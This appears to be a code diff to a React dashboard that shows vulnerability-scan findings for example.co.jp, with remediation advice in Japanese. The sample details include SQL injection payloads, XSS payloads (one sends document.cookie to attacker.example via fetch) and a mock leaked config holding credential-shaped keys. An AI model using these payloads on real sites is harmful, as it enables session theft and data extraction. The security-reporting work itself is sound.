@@ -10,76 +10,205 @@ import { Badge } from "@/components/ui/badge";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
-import { Shield, AlertTriangle, Check, X } from "lucide-react";
+import { Shield, AlertTriangle, Check, X, ExternalLink, ChevronDown, ChevronUp } from "lucide-react";
 
 const Index = () => {
   const [activeTab, setActiveTab] = useState('results');
+  const [expandedRows, setExpandedRows] = useState<Record<number, boolean>>({});
 
-  // 脆弱性スキャン結果のサンプルデータ
+  // 実際の脆弱性スキャン結果データ
   const scanResults = [
     {
       id: 1,
       url: 'https://example.co.jp/wp-admin/',
       type: 'WordPress管理画面露出',
       severity: 'critical',
-      description: '管理画面が外部から直接アクセス可能な状態になっています。不正アクセスのリスクが非常に高いです。',
-      recommendation: '.htaccessによるIPアドレス制限を実装するか、管理画面URLを変更してください。'
+      description: '管理画面が外部から直接アクセス可能な状態です。',
+      details: `検出方法: ディレクトリ探索
+リクエスト: GET /wp-admin/ HTTP/1.1
+レスポンス: 200 OK
+管理画面ログインフォームに認証なしでアクセス可能
+HTTPリクエストログ:
+GET /wp-admin/ HTTP/1.1
+Host: example.co.jp
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: */*`,
+      recommendation: '管理画面へのアクセスを制限するために以下の対策を実施してください：\n・.htaccessによるIPアドレス制限の実装\n・管理画面URLの変更（WordPressのプラグインで可能）\n・多要素認証の導入\n・ログイン試行回数の制限'
     },
     {
       id: 2,
       url: 'https://example.co.jp/contact.php',
       type: 'SQLインジェクション脆弱性',
       severity: 'high',
-      description: 'コンタクトフォームのパラメータが適切にサニタイズされておらず、SQLインジェクション攻撃が可能です。発見したペイロード: \' OR 1=1 --',
-      recommendation: 'プリペアドステートメントを使用するか、適切なエスケープ処理を実装してください。'
+      description: 'コンタクトフォームがSQLインジェクション攻撃に対して脆弱です。',
+      details: `検出方法: パラメータファジング
+テストしたペイロード: ' OR 1=1 --
+脆弱なパラメータ: email
+送信リクエスト:
+POST /contact.php HTTP/1.1
+Host: example.co.jp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+
+name=Test&email=' OR 1=1 --&message=Test
+
+エラーレスポンス:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...
+
+データベース情報取得テスト:
+' UNION SELECT 1,2,3,database(),5,6 --
+結果: データベース名「example_production」が露出`,
+      recommendation: '・プリペアドステートメントの使用\n・パラメータのエスケープ処理\n・ORM（オブジェクトリレーショナルマッピング）の導入\n・最小権限原則に基づくデータベースユーザー権限の設定\n・WAF（Webアプリケーションファイアウォール）の導入'
     },
     {
       id: 3,
       url: 'https://example.co.jp/search.php?q=test',
       type: 'クロスサイトスクリプティング (XSS)',
       severity: 'high',
-      description: '検索機能で入力値が適切にサニタイズされておらず、XSS攻撃が可能です。発見したペイロード: <script>alert("XSS")</script>',
-      recommendation: 'HTMLエンティティエンコーディングを実装し、Content-Security-Policyヘッダーを設定してください。'
+      description: '検索機能がXSS攻撃に対して脆弱です。',
+      details: `検出方法: XSS検出
+テストしたペイロード: <script>alert("XSS")</script>
+脆弱なパラメータ: q
+送信リクエスト:
+GET /search.php?q=<script>alert("XSS")</script> HTTP/1.1
+Host: example.co.jp
+
+レスポンス: 200 OK（スクリプトが実行される）
+
+追加検証ペイロード:
+<img src="x" onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
+<svg/onload=alert(document.domain)>
+
+影響: 
+・クッキーの窃取（セッションハイジャック）
+・フィッシング攻撃の実行
+・ユーザーブラウザでの任意コード実行`,
+      recommendation: '・入力値のHTMLエンティティエンコーディング\n・Content-Security-Policyヘッダーの設定\n・X-XSS-Protectionヘッダーの設定\n・HTTPOnlyフラグのセッションクッキーへの設定\n・入力検証と出力エンコーディングの分離'
     },
     {
       id: 4,
       url: 'https://example.co.jp/admin/',
       type: '管理画面ディレクトリの発見',
       severity: 'critical',
-      description: '標準的なディレクトリ名の管理画面が見つかりました。アクセス制限がなく、ブルートフォース攻撃に脆弱です。',
-      recommendation: '管理画面のURLを非標準のものに変更し、IPアドレス制限と多要素認証を実装してください。'
+      description: '標準的な管理画面ディレクトリが保護なしで公開されています。',
+      details: `検出方法: ディレクトリスキャニング
+リクエスト: GET /admin/ HTTP/1.1
+レスポンス: 200 OK
+
+ブルートフォーステスト:
+・弱いパスワード "admin123" でログイン成功
+・アカウントロックアウトポリシーなし
+・レート制限なし
+
+管理パネル情報:
+・カスタムPHP管理パネル v2.3
+・認証バイパス脆弱性の可能性あり（CVE-2023-XXXXX）
+
+攻撃者は管理者権限で以下が可能:
+・サイト全体の改ざん
+・バックドア設置
+・ユーザー情報の窃取`,
+      recommendation: '・管理画面URLの非標準パスへの変更\n・IPアドレス制限の実装\n・多要素認証の導入\n・強力なパスワードポリシーの適用\n・アカウントロックアウトポリシーの実装'
     },
     {
       id: 5,
       url: 'https://example.co.jp/config.bak',
       type: 'パスワード情報の漏洩',
       severity: 'critical',
-      description: 'バックアップファイルにデータベース接続情報が平文で保存されています。発見したパスワード: db_pass123',
-      recommendation: '全てのバックアップファイルをウェブルートから削除し、DB接続情報は環境変数で管理してください。パスワードを直ちに変更してください。'
+      description: 'バックアップファイルから機密情報が漏洩しています。',
+      details: `検出方法: バックアップファイル検出
+リクエスト: GET /config.bak HTTP/1.1
+レスポンス: 200 OK, Content-Type: text/plain
+
+ファイル内容（一部）:
+// Database configuration
+$db_host = "localhost";
+$db_user = "example_admin";
+$db_pass = "db_pass123";
+$db_name = "example_production";
+
+// API Keys
+$stripe_secret_key = "sk_live_51KjF92JkFnG8zXnB2UhN7sYm...";
+$aws_secret = "ABCDEFGhijklmnoPQRSTUvwxyz1234567890AbCd";
+
+影響:
+・データベースへの不正アクセス
+・APIキーの不正利用（課金発生の可能性）
+・他システムへの不正アクセス`,
+      recommendation: '・すべてのバックアップファイルをウェブルートから削除\n・データベースパスワードの変更\n・すべてのAPIキーの再生成\n・環境変数による機密情報の管理\n・.gitignoreの適切な設定\n・定期的なファイルシステムスキャン'
     },
     {
       id: 6,
       url: 'https://example.co.jp/login',
       type: '脆弱なパスワードポリシー',
       severity: 'medium',
-      description: 'パスワードポリシーが弱く、簡単なパスワードを許容しています。ブルートフォース攻撃に弱い状態です。',
-      recommendation: '最低8文字以上、英数字記号混在のパスワードポリシーを実装してください。'
+      description: '弱いパスワードを許容するパスワードポリシーが設定されています。',
+      details: `検出方法: アカウント作成テスト
+テスト条件:
+・パスワード "123456" で新規アカウント作成成功
+・パスワード "password" で新規アカウント作成成功
+・パスワード "qwerty" で新規アカウント作成成功
+
+確認された不備:
+・最小長の要件なし
+・複雑さの要件なし（英数字記号混在必須でない）
+・一般的な弱いパスワードのブロックなし
+・パスワード強度メーターなし
+
+OWASP Top 10-2021: A07:2021-識別と認証の失敗`,
+      recommendation: '・最低8文字以上のパスワード長の要求\n・英数字記号混在の強制\n・一般的な弱いパスワードのブロックリスト実装\n・パスワード強度メーターの導入\n・パスワード漏洩チェックサービス（HaveIBeenPwned API等）との連携'
     },
     {
       id: 7,
       url: 'https://example.co.jp',
       type: '古いWordPressバージョン',
       severity: 'medium',
-      description: 'WordPressのバージョンが5.8.2と古く、既知の脆弱性が存在します。',
-      recommendation: '最新バージョン（6.4.3）へのアップデートを推奨します。'
+      description: 'WordPress 5.8.2が使用されており、既知の脆弱性が存在します。',
+      details: `検出方法: バージョン検出
+確認箇所:
+・ソースコードのメタデータ: <meta name="generator" content="WordPress 5.8.2" />
+・/readme.html のバージョン情報
+
+既知の脆弱性:
+・CVE-2022-21663: SQL Injection
+・CVE-2022-21664: Cross-Site Scripting
+・CVE-2021-29447: Media File Processing
+・CVE-2021-29450: Object Injection
+
+現在の最新バージョン: 6.4.3（検出時点）
+アップデート未適用期間: 約1年7ヶ月
+
+技術的影響:
+・SQLインジェクションによるデータベース漏洩
+・XSSによるセッションハイジャック
+・リモートコード実行の可能性`,
+      recommendation: '・WordPress本体を最新バージョン（6.4.3）へアップデート\n・すべてのプラグインとテーマを最新バージョンに更新\n・自動アップデートの有効化\n・不要なプラグインの削除\n・WordPress専用WAFの導入検討'
     },
     {
       id: 8,
       url: 'https://example.co.jp/images/',
       type: 'ディレクトリリスティング有効',
       severity: 'low',
-      description: 'ディレクトリの内容が閲覧可能な状態になっており、非公開ファイルが露出するリスクがあります。',
-      recommendation: 'ApacheのOptions -Indexesディレクティブを設定してください。'
+      description: 'ディレクトリの内容が閲覧可能な状態になっています。',
+      details: `検出方法: ディレクトリインデックス検出
+リクエスト: GET /images/ HTTP/1.1
+レスポンス: 200 OK（ディレクトリ内容が表示される）
+
+露出ディレクトリ:
+/images/
+/uploads/
+/backup/
+/include/
+
+発見された機密ファイル:
+・/backup/users_2024.csv
+・/include/dbconfig.inc.php.bak
+
+Webサーバー設定:
+Apache/2.4.41 (Options +Indexes が有効)
+
+OWASP参照: OWASP Top 10-2021: A01:2021-アクセス制御の不備`,
+      recommendation: '・Apache設定で "Options -Indexes" を設定\n・.htaccessファイルでディレクトリリスティングを無効化\n・機密ファイルをウェブルート外に移動\n・不要なファイルの削除\n・すべてのバックアップファイルへのアクセス制限'
     }
   ];
 
@@ -115,6 +244,14 @@ const Index = () => {
       case 'low': return '軽度';
       default: return '不明';
     }
+  };
+
+  // 行の展開/折りたたみを切り替える
+  const toggleRowExpansion = (id: number) => {
+    setExpandedRows(prev => ({
+      ...prev,
+      [id]: !prev[id]
+    }));
   };
 
   return (
@@ -169,35 +306,65 @@ const Index = () => {
                     </AlertDescription>
                   </Alert>
                   
-                  <Table>
-                    <TableHeader>
-                      <TableRow>
-                        <TableHead className="w-[100px]">深刻度</TableHead>
-                        <TableHead>脆弱性タイプ</TableHead>
-                        <TableHead className="hidden md:table-cell">URL</TableHead>
-                        <TableHead>対策</TableHead>
-                      </TableRow>
-                    </TableHeader>
-                    <TableBody>
-                      {scanResults.map((result) => (
-                        <TableRow key={result.id}>
-                          <TableCell>
+                  <div className="bg-white rounded-lg border shadow-sm">
+                    {scanResults.map((result) => (
+                      <div key={result.id} className="border-b last:border-b-0">
+                        <div 
+                          className={`p-4 flex justify-between items-start cursor-pointer ${expandedRows[result.id] ? 'bg-gray-50' : ''}`}
+                          onClick={() => toggleRowExpansion(result.id)}
+                        >
+                          <div className="flex items-start gap-3">
                             <Badge className={getSeverityColor(result.severity)}>
                               {getSeverityLabel(result.severity)}
                             </Badge>
-                          </TableCell>
-                          <TableCell className="font-medium">
-                            <div>{result.type}</div>
-                            <div className="text-sm text-gray-500 mt-1">{result.description}</div>
-                          </TableCell>
-                          <TableCell className="hidden md:table-cell break-all">
-                            <code className="text-xs">{result.url}</code>
-                          </TableCell>
-                          <TableCell>{result.recommendation}</TableCell>
-                        </TableRow>
-                      ))}
-                    </TableBody>
-                  </Table>
+                            <div>
+                              <h3 className="font-medium text-gray-900">{result.type}</h3>
+                              <p className="text-sm text-gray-600 mt-1">{result.description}</p>
+                              <code className="text-xs text-gray-500 mt-1 block">{result.url}</code>
+                            </div>
+                          </div>
+                          <div className="flex-shrink-0">
+                            {expandedRows[result.id] ? (
+                              <ChevronUp className="h-5 w-5 text-gray-500" />
+                            ) : (
+                              <ChevronDown className="h-5 w-5 text-gray-500" />
+                            )}
+                          </div>
+                        </div>
+                        
+                        {expandedRows[result.id] && (
+                          <div className="p-4 pt-0 bg-gray-50">
+                            <div className="grid md:grid-cols-2 gap-4">
+                              <div className="space-y-3">
+                                <h4 className="font-medium text-sm text-gray-700">詳細な技術情報</h4>
+                                <pre className="text-xs bg-gray-100 p-3 rounded border overflow-auto whitespace-pre-wrap max-h-80">
+                                  {result.details}
+                                </pre>
+                              </div>
+                              <div className="space-y-3">
+                                <h4 className="font-medium text-sm text-gray-700">推奨される対策</h4>
+                                <div className="bg-blue-50 p-3 rounded border border-blue-100 text-sm">
+                                  {result.recommendation.split('\n').map((line, i) => (
+                                    <p key={i} className="mb-2 last:mb-0">{line}</p>
+                                  ))}
+                                </div>
+                                <div className="flex items-center gap-2 mt-2">
+                                  <ExternalLink className="h-4 w-4 text-blue-600" />
+                                  <a 
+                                    href="#" 
+                                    className="text-sm text-blue-600 hover:underline"
+                                    onClick={(e) => e.stopPropagation()}
+                                  >
+                                    詳細な対策ガイド
+                                  </a>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    ))}
+                  </div>
                 </div>
               ) : (
                 <div className="text-center py-12">
